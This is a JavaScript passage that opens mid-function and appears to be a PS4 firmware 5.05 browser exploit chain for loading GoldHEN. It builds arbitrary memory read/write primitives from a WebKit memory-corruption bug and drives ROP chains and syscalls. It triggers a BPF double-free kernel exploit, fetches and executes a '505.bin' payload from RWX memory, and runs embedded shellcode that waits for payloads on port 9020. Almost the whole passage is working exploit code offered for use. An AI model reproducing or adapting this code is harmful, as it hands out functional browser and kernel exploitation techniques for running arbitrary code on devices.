  hold2 = {
   a: 0,
   b: 0,
   c: 0,
   d: 0
  };
  holdz1 = p.leakval(hold2);
  holdz = p.leakval(hold1);
  if (holdz.low - 0x30 == holdz1.low)
   break;
 }
 var pushframe = [];
 pushframe.length = 0x80;
 var rtv = 0;
 var funcbuf;
 var funcbuf32 = new Uint32Array(0x100);
 nogc.push(funcbuf32);
 var launch_chain = function (chain) {
  var stackPointer = 0;
  var stackCookie = 0;
  var orig_reenter_rip = 0;
  var reenter_help = {
   length: {
    valueOf: function () {
     orig_reenter_rip = p.read8(stackPointer);
     stackCookie = p.read8(stackPointer.add32(8));
     var returnToFrame = stackPointer;
     var ocnt = chain.count;
     chain.push_write8(stackPointer, orig_reenter_rip);
     chain.push_write8(stackPointer.add32(8), stackCookie);
     if (chain.runtime)
      returnToFrame = chain.runtime(stackPointer);
     chain.push(gadgets["pop rsp"]);
     chain.push(returnToFrame);
     chain.count = ocnt;
     p.write8(stackPointer, gadgets["pop rsp"]);
     p.write8(stackPointer.add32(8), chain.stackBase);
    }
   }
  };
  funcbuf = p.read8(p.leakval(funcbuf32).add32(0x10));
  p.write8(funcbuf.add32(0x30), gadgets["setjmp"]);
  p.write8(funcbuf.add32(0x80), gadgets["jop"]);
  p.write8(funcbuf, funcbuf);
  p.write8(parseFloatStore, gadgets["jop"]);
  var orig_hold = p.read8(holdz1);
  var orig_hold48 = p.read8(holdz1.add32(0x48));
  p.write8(holdz1, funcbuf.add32(0x50));
  p.write8(holdz1.add32(0x48), funcbuf);
  parseFloat(hold2, hold2, hold2, hold2, hold2, hold2);
  p.write8(holdz1, orig_hold);
  p.write8(holdz1.add32(0x48), orig_hold48);
  stackPointer = p.read8(funcbuf.add32(0x10));
  rtv = Array.prototype.splice.apply(reenter_help);
  return p.leakval(rtv);
 };
 p.loadchain = launch_chain;
 var chain = new window.rop;
 var returnvalue;
 p.fcall_ = function (rip, rdi, rsi, rdx, rcx, r8, r9) {
  chain.clear();
  chain.fcall(rip, rdi, rsi, rdx, rcx, r8, r9);
  chain.push(window.gadgets["pop rdi"]);
  chain.push(chain.stackBase.add32(0x4000 - 8));
  chain.push(window.gadgets["mov [rdi], rax"]);
  chain.push(window.gadgets["pop rax"]);
  chain.push(p.leakval(0x41414242));
  if (chain.run().low != 0x41414242)
   throw new Error("unexpected rop behaviour");
  returnvalue = p.read8(chain.stackBase.add32(0x4000 - 8));
 };
 p.fcall = function () {
  var rv = p.fcall_.apply(this, arguments);
  return returnvalue;
 };
 if (p.fcall(window.gadgets["mov rax, rdi"], 0x41414141) != 41414141)
  alert("userland ROP execution not working");
 const libkernel_size = 0x30000;
 var temp_buf = new Uint8Array(libkernel_size);
 const temp_buf_addr = p.read8(p.leakval(temp_buf).add32(0x10));
 p.fcall(window.gadgets["memcpy"], temp_buf_addr, window.o2lk(0), libkernel_size);
 var dview32 = new Uint32Array(1);
 var dview8 = new Uint8Array(dview32.buffer);
 for (var i = 0; i < libkernel_size; i++) {
  if (temp_buf[i] == 0x48 && temp_buf[i + 1] == 0xC7 && temp_buf[i + 2] == 0xC0 && temp_buf[i + 7] == 0x49 && temp_buf[i + 8] == 0x89 && temp_buf[i + 9] == 0xCA && temp_buf[i + 10] == 0x0F && temp_buf[i + 11] == 0x05) {
   dview8[0] = temp_buf[i + 3];
   dview8[1] = temp_buf[i + 4];
   dview8[2] = temp_buf[i + 5];
   dview8[3] = temp_buf[i + 6];
   const syscall_no = dview32[0];
   const syscall_offset = window.o2lk(i & 0xFFFFFFF0);
   window.syscalls[syscall_no] = syscall_offset;
  }
 }
 p.syscall = function (sysc, rdi, rsi, rdx, rcx, r8, r9) {
  if (typeof sysc == "string")
   sysc = window.syscallnames[sysc];
  if (typeof sysc != "number")
   throw new Error("invalid syscall");
  var address = window.syscalls[sysc];
  if (address == undefined)
   throw new Error("undefined syscall number: " + sysc);
  return p.fcall(address, rdi, rsi, rdx, rcx, r8, r9);
 };
 p.socket = function () {
  return p.syscall('sys_socket', 2, 1, 6);
 };
 p.connectSocket = function (s, ip, port) {
  var sockAddr = new Uint32Array(0x10);
  var sockAddrPtr = p.read8(p.leakval(sockAddr).add32(0x10));
  var ipSegments = ip.split('.');
  for (var seg = 0; seg < 4; seg++)
   ipSegments[seg] = parseInt(ipSegments[seg]);
  sockAddr[0] |= (((port >> 8) & 0xFF) << 0x10 | port << 0x18) | 0x200;
  sockAddr[1] = ipSegments[3] << 24 | ipSegments[2] << 16 | ipSegments[1] << 8 | ipSegments[0];
  sockAddr[2] = 0;
  sockAddr[3] = 0;
  return p.syscall('sys_connect', s, sockAddrPtr, 0x10);
 };
 p.writeSocket = function (s, data, size) {
  return p.syscall('sys_write', s, data, size);
 };
 p.closeSocket = function (s) {
  return p.syscall('sys_close', s);
 };
 window.spawnthread = function (chain) {
  var contextp = p.malloc32(0x1800);
  var contextz = contextp.backing;
  contextz[0] = 1337;
  p.syscall("sys_mlockall", 1);
  var thread2 = new window.rop();
  thread2.push(window.gadgets["ret"]);
  thread2.push(window.gadgets["ret"]);
  thread2.push(window.gadgets["ret"]);
  thread2.push(window.gadgets["ret"]);
  chain(thread2);
  p.write8(contextp, window.gadgets["ret"]);
  p.write8(contextp.add32(0x10), thread2.stackBase);
  var thread = p.malloc(0x08);
  p.fcall(window.gadgets["scePthreadCreate"], thread, 0, window.gadgets["longjmp"], contextp, p.stringify("GottaGoFast"));
  window.nogc.push(contextp);
  window.nogc.push(thread2);
  return thread2;
 };
 window.try_dlsym = function () {
  var scratch32 = new Uint32Array(0x400);
  var scratch = p.read8(p.leakval(scratch32).add32(0x10));
  var module_id = p.syscall("sys_dynlib_load_prx", p.stringify("libkernel_web.sprx"), 0, scratch, 0);
  alert("sys_dynlib_load_prx ret: " + module_id + ", scratch: " + p.read8(scratch));
  var sym = p.syscall("sys_dynlib_dlsym", p.read8(scratch), p.stringify("sceKernelLoadStartModule"), scratch);
  alert("sys_dynlib_dlsym ret: " + sym + ", scratch: " + p.read8(scratch));
  var sceKernelLoadStartModule = p.read8(scratch);
  alert(p.fcall(sceKernelLoadStartModule, p.stringify("libkernel_web.sprx"), 0, scratch.add32(0x40), 0, 0, 0));
 };
 window.try_sys_getcontext_leak = function () {
  var mem = p.malloc(0x500);
  alert(window.hexdump_8(mem, 0x500));
  p.syscall("sys_getcontext", mem);
  alert(window.hexdump_8(mem, 0x500));
  p.syscall("sys_getcontext", mem);
  alert(window.hexdump_8(mem, 0x500));
  p.syscall("sys_getcontext", mem);
  alert(window.hexdump_8(mem, 0x500));
 };
 window.try_sys_randomized_path_leak = function () {
  var mem = p.malloc(0x1000000);
  alert(window.hexdump_8(mem, 0x500));
  var len_buf = p.malloc(0x08);
  p.write8(len_buf, new int64(0, 2147483648));
  alert(window.hexdump_8(len_buf, 8));
  alert(p.syscall("sys_randomized_path", 0, mem, len_buf));
  alert(p.read8(p.fcall_saved_rcx));
  alert(window.hexdump_8(mem, 0x500));
 };
 function allset(){
 localStorage.HenLoaded="yes";sessionStorage.HenLoaded="yes";
 msgs.innerHTML="PS4 Exploited And GoldHEN v2.2.4 Loaded";
}
 function awaitpl(){
  msgs.innerHTML="GoldHEN Already Loaded & BinLoader Ready,<br>Send A Payload To Port 9020 Now";
 }
 function runPayload(path) {
  var req = new XMLHttpRequest();
  req.responseType = "arraybuffer";
  req.onreadystatechange = function () {
   if (req.readyState == 4) {
    try {
     var code_addr = new int64(0x26100000, 0x00000009);
     var mapped_address = p.syscall("sys_mmap", code_addr, 0x300000, 7, 0x41000, -1, 0);
     if (mapped_address != '926100000')
      throw "sys_mmap failed";
     var padding = new Uint8Array(4 - (req.response.byteLength % 4) % 4);
     var tmp = new Uint8Array(req.response.byteLength + padding.byteLength);
     tmp.set(new Uint8Array(req.response), 0);
     tmp.set(padding, req.response.byteLength);
     var shellcode = new Uint32Array(tmp.buffer);
     for (var i = 0; i < shellcode.length; i++)
      p.write4(code_addr.add32(0x100000 + i * 4), shellcode[i]);
     p.fcall(code_addr);
     p.syscall("sys_munmap", code_addr, 0x300000);
    } catch (e) {
     alert("exception: " + e);
    }
   }
  };
  req.open('GET', path);
  req.send();
 };
 function runBinloader(){
   var code_addr = new int64(0x26100000, 0x00000009);
   var mapped_address = p.syscall("sys_mmap", code_addr, 0x300000, 7, 0x41000, -1, 0);
   if (mapped_address == '926100000') {
    try {
     var shcode = [0x31fe8948, 0x3d8b48c0, 0x00003ff4, 0xed0d8b48, 0x4800003f, 0xaaf3f929, 0xe8f78948, 0x00000060, 0x48c3c031, 0x0003c0c7, 0x89490000, 0xc3050fca, 0x06c0c748, 0x49000000, 0x050fca89, 0xc0c748c3, 0x0000001e, 0x0fca8949, 0xc748c305, 0x000061c0, 0xca894900, 0x48c3050f, 0x0068c0c7, 0x89490000, 0xc3050fca, 0x6ac0c748, 0x49000000, 0x050fca89, 0x909090c3, 0x90909090, 0x90909090, 0x90909090, 0xb8555441, 0x00003c23, 0xbed23153, 0x00000001, 0x000002bf, 0xec834800, 0x2404c610, 0x2444c610, 0x44c70201, 0x00000424, 0x89660000, 0xc6022444, 0x00082444, 0x092444c6, 0x2444c600, 0x44c6000a, 0xc6000b24, 0x000c2444, 0x0d2444c6, 0xff78e800, 0x10baffff, 0x41000000, 0x8948c489, 0xe8c789e6, 0xffffff73, 0x00000abe, 0xe7894400, 0xffff73e8, 0x31d231ff, 0xe78944f6, 0xffff40e8, 0x48c589ff, 0x200000b8, 0x00000926, 0xc300c600, 0xebc38948, 0x801f0f0c, 0x00000000, 0x01489848, 0x1000bac3, 0x89480000, 0xe8ef89de, 0xfffffef7, 0xe87fc085, 0xe8e78944, 0xfffffef8, 0xf1e8ef89, 0x48fffffe, 0x200000b8, 0x00000926, 0x48d0ff00, 0x5b10c483, 0xc35c415d, 0xc3c3c3c3];
     var shellbuf = p.malloc32(0x1000);
     for (var i = 0; i < shcode.length; i++)
      shellbuf.backing[i] = shcode[i];
     p.syscall("sys_mprotect", shellbuf, 0x4000, 7);
     var thread_id_ptr = p.malloc(0x08);
     p.fcall(window.gadgets["scePthreadCreate"], thread_id_ptr, 0, shellbuf, 0, p.stringify("loader"));
     awaitpl();
    } catch (e) {
     alert(e);
    }
   }
}
 if (p.syscall("sys_setuid", 0) != 0) {
  localStorage.HenLoaded="no";
  kernExploit_bpf_double_free();
 } 
 if(localStorage.HenLoaded=="yes" && sessionStorage.HenLoaded!="yes"){runBinloader();}
 else if(localStorage.HenLoaded=="yes" && sessionStorage.HenLoaded=="yes"){allset();}
 else if(localStorage.HenLoaded!="yes"){runPayload('505.bin');allset();}
}
function exploit() {
 var instancespr = [];
 for (var i = 0; i < 0x1000; i++) {
  instancespr[i] = new Uint32Array(1);
  instancespr[i][makeid()] = 50057;
 }
 var tgt = {
  a: 0,
  b: 0,
  c: 0,
  d: 0
 };
 var y = new ImageData(1, 0x4000);
 postMessage("", "*", [y.data.buffer]);
 var props = {};
 for (var i = 0; i < (0x4000 / 2); ) {
  props[i++] = {
   value: 0x42424242
  };
  props[i++] = {
   value: tgt
  };
 }
 var foundLeak = undefined;
 var foundIndex = 0;
 var maxCount = 0x100;
 while (foundLeak == undefined && maxCount > 0) {
  maxCount--;
  history.pushState(y, "");
  Object.defineProperties({}, props);
  var leak = new Uint32Array(history.state.data.buffer);
  for (var i = 0; i < leak.length - 6; i++) {
   if (leak[i] == 0x42424242 && leak[i + 0x1] == 0xFFFF0000 && leak[i + 0x2] == 0x00000000 && leak[i + 0x3] == 0x00000000 && leak[i + 0x4] == 0x00000000 && leak[i + 0x5] == 0x00000000 && leak[i + 0x6] == 0x0000000E && leak[i + 0x7] == 0x00000000 && leak[i + 0xA] == 0x00000000 && leak[i + 0xB] == 0x00000000 && leak[i + 0xC] == 0x00000000 && leak[i + 0xD] == 0x00000000 && leak[i + 0xE] == 0x0000000E && leak[i + 0xF] == 0x00000000) {
    foundIndex = i;
    foundLeak = leak;
    break;
   }
  }
 }
 if (!foundLeak) {
  failed = true;
  fail("Failed to find leak!");
 }
 var firstLeak = Array.prototype.slice.call(foundLeak, foundIndex, foundIndex + 0x40);
 var leakJSVal = new int64(firstLeak[8], firstLeak[9]);
 try {
  Array.prototype.__defineGetter__(100, () => 1);
  var f = document.body.appendChild(document.createElement('iframe'));
  var a = new f.contentWindow.Array(13.37, 13.37);
  var b = new f.contentWindow.Array(u2d(leakJSVal.low + 0x10, leakJSVal.hi), 13.37);
  var master = new Uint32Array(0x1000);
  var slave = new Uint32Array(0x1000);
  var leakval_u32 = new Uint32Array(0x1000);
  var leakval_helper = [slave, 2, 3, 4, 5, 6, 7, 8, 9, 10];
  tgt.a = u2d(0x00000800, 0x01602300);
  tgt.b = 0;
  tgt.c = leakval_helper;
  tgt.d = 0x1337;
  var c = Array.prototype.concat.call(a, b);
  document.body.removeChild(f);
  var hax = c[0];
  c[0] = 0;
  tgt.c = c;
  hax[2] = 0;
  hax[3] = 0;
  Object.defineProperty(Array.prototype, 100, {
   get: undefined
  });
  tgt.c = leakval_helper;
  var butterfly = new int64(hax[2], hax[3]);
  butterfly.low += 0x10;
  tgt.c = leakval_u32;
  var leakval_u32_old = new int64(hax[4], hax[5]);
  hax[4] = butterfly.low;
  hax[5] = butterfly.hi;
  tgt.c = master;
  hax[4] = leakval_u32[0];
  hax[5] = leakval_u32[1];
  var addr_to_slavebuf = new int64(master[4], master[5]);
  tgt.c = leakval_u32;
  hax[4] = leakval_u32_old.low;
  hax[5] = leakval_u32_old.hi;
  tgt.c = 0;
  hax = 0;
  var prim = {
   write8: function (addr, val) {
    master[4] = addr.low;
    master[5] = addr.hi;
    if (val instanceof int64) {
     slave[0] = val.low;
     slave[1] = val.hi;
    } else {
     slave[0] = val;
     slave[1] = 0;
    }
    master[4] = addr_to_slavebuf.low;
    master[5] = addr_to_slavebuf.hi;
   },
   write4: function (addr, val) {
    master[4] = addr.low;
    master[5] = addr.hi;
    slave[0] = val;
    master[4] = addr_to_slavebuf.low;
    master[5] = addr_to_slavebuf.hi;
   },
   read8: function (addr) {
    master[4] = addr.low;
    master[5] = addr.hi;
    var rtv = new int64(slave[0], slave[1]);
    master[4] = addr_to_slavebuf.low;
    master[5] = addr_to_slavebuf.hi;
    return rtv;
   },
   read4: function (addr) {
    master[4] = addr.low;
    master[5] = addr.hi;
    var rtv = slave[0];
    master[4] = addr_to_slavebuf.low;
    master[5] = addr_to_slavebuf.hi;
    return rtv;
   },
   leakval: function (jsval) {
    leakval_helper[0] = jsval;
    var rtv = this.read8(butterfly);
    this.write8(butterfly, new int64(0x41414141, 0xffff0000));
    return rtv;
   },
   createval: function (jsval) {
    this.write8(butterfly, jsval);
    var rt = leakval_helper[0];
    this.write8(butterfly, new int64(0x41414141, 0xffff0000));
    return rt;
   }
  };
  window.prim = prim;
  history.go(-(history.length-1));
  setTimeout(window.stage2, 250);
 } catch (e) {
  failed = true;
  fail("Exception: " + e);
 }
}
